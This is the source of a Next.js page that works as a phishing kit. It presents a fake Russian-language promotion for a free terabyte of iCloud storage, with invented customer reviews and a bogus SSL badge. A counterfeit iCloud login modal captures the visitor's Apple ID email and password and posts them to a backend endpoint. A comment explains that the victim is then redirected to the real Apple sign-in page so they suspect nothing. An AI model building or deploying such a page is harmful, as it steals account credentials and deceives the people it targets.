import { useState } from 'react';
import Head from 'next/head';

export default function Home() {
  const [showModal, setShowModal] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    // Отправляем данные на наш API
    const res = await fetch('/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    });

    if (res.ok) {
      // Перенаправляем на настоящий Apple ID, чтобы жертва ничего не заподозрила
      window.location.href = 'https://appleid.apple.com/sign-in';
    } else {
      alert('Ошибка, попробуйте позже');
      setLoading(false);
    }
  };

  return (
    <>
      <Head>
        <title>Бесплатно 1ТБ в iCloud!</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      </Head>

      <style jsx>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        body {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          display: flex;
          justify-content: center;
          align-items: center;
          padding: 20px;
        }
        .container {
          max-width: 800px;
          width: 100%;
        }
        .card {
          background: white;
          border-radius: 20px;
          padding: 40px;
          box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
          text-align: center;
          color: #1a1a1a;
          font-size: 32px;
          margin-bottom: 30px;
        }
        .offer-badge {
          background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
          color: white;
          text-align: center;
          padding: 15px;
          border-radius: 50px;
          font-size: 24px;
          font-weight: bold;
          margin-bottom: 30px;
          animation: pulse 2s infinite;
        }
        @keyframes pulse {
          0% { transform: scale(1); }
          50% { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,107,107,0.5); }
          100% { transform: scale(1); }
        }
        .reviews {
          margin: 30px 0;
        }
        .review {
          background: #f8f9fa;
          border-radius: 12px;
          padding: 15px;
          margin-bottom: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
        }
        .review-avatar {
          width: 50px;
          height: 50px;
          border-radius: 50%;
          background: linear-gradient(135deg, #667eea, #764ba2);
          color: white;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: bold;
          font-size: 20px;
        }
        .review-content {
          flex: 1;
        }
        .review-name {
          font-weight: bold;
          color: #333;
          margin-bottom: 5px;
        }
        .review-text {
          color: #666;
          font-size: 14px;
        }
        .review-rating {
          color: #ffd700;
          font-size: 18px;
        }
        .claim-btn {
          background: linear-gradient(135deg, #00b09b, #96c93d);
          color: white;
          border: none;
          padding: 20px 40px;
          font-size: 28px;
          font-weight: bold;
          border-radius: 60px;
          cursor: pointer;
          width: 100%;
          transition: transform 0.2s;
          box-shadow: 0 10px 20px rgba(0,176,155,0.3);
          margin-top: 20px;
        }
        .claim-btn:hover {
          transform: translateY(-2px);
        }
        /* Модальное окно */
        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0,0,0,0.7);
          display: flex;
          justify-content: center;
          align-items: center;
          z-index: 1000;
        }
        .modal {
          background: white;
          padding: 40px;
          border-radius: 20px;
          width: 90%;
          max-width: 400px;
          position: relative;
        }
        .modal h2 {
          color: #1a1a1a;
          margin-bottom: 20px;
          text-align: center;
        }
        .modal input {
          width: 100%;
          padding: 15px;
          margin: 10px 0;
          border: 2px solid #e0e0e0;
          border-radius: 10px;
          font-size: 16px;
        }
        .modal input:focus {
          outline: none;
          border-color: #667eea;
        }
        .modal button {
          width: 100%;
          padding: 15px;
          background: linear-gradient(135deg, #667eea, #764ba2);
          color: white;
          border: none;
          border-radius: 10px;
          font-size: 18px;
          font-weight: bold;
          cursor: pointer;
          margin-top: 20px;
        }
        .modal button:disabled {
          opacity: 0.7;
          cursor: not-allowed;
        }
        .close-btn {
          position: absolute;
          top: 10px;
          right: 10px;
          background: none;
          border: none;
          font-size: 24px;
          cursor: pointer;
          color: #999;
        }
        .security-note {
          text-align: center;
          color: #999;
          font-size: 12px;
          margin-top: 15px;
        }
      `}</style>

      <div className="container">
        <div className="card">
          <div className="offer-badge">
            🎉 АКЦИЯ: 1 ТБ в iCloud БЕСПЛАТНО! 🎉
          </div>

          <div className="reviews">
            <div className="review">
              <div className="review-avatar">А</div>
              <div className="review-content">
                <div className="review-name">Анна С.</div>
                <div className="review-rating">⭐⭐⭐⭐⭐</div>
                <div className="review-text">"Огромное спасибо! Реально получила 1ТБ за минуту!"</div>
              </div>
            </div>

            <div className="review">
              <div className="review-avatar">Д</div>
              <div className="review-content">
                <div className="review-name">Дмитрий К.</div>
                <div className="review-rating">⭐⭐⭐⭐⭐</div>
                <div className="review-text">"Думал развод, но нет. Всё работает, терабайт уже мой!"</div>
              </div>
            </div>

            <div className="review">
              <div className="review-avatar">Е</div>
              <div className="review-content">
                <div className="review-name">Елена В.</div>
                <div className="review-rating">⭐⭐⭐⭐⭐</div>
                <div className="review-text">"Муж не верил, а я получила. Теперь все фото на iCloud!"</div>
              </div>
            </div>
          </div>

          <button 
            className="claim-btn"
            onClick={() => setShowModal(true)}
          >
            ПОЛУЧИТЬ 1 ТБ
          </button>
        </div>
      </div>

      {showModal && (
        <div className="modal-overlay" onClick={() => setShowModal(false)}>
          <div className="modal" onClick={e => e.stopPropagation()}>
            <button className="close-btn" onClick={() => setShowModal(false)}>×</button>
            <h2>Вход в iCloud</h2>
            <p style={{textAlign: 'center', marginBottom: '20px', color: '#666'}}>
              Введите данные Apple ID для активации 1 ТБ
            </p>
            <form onSubmit={handleSubmit}>
              <input
                type="email"
                placeholder="Apple ID"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
              <input
                type="password"
                placeholder="Пароль"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
              <button type="submit" disabled={loading}>
                {loading ? 'Обработка...' : 'Активировать'}
              </button>
            </form>
            <div className="security-note">
              🔒 Защищено SSL-шифрованием
            </div>
          </div>
        </div>
      )}
    </>
  );
}
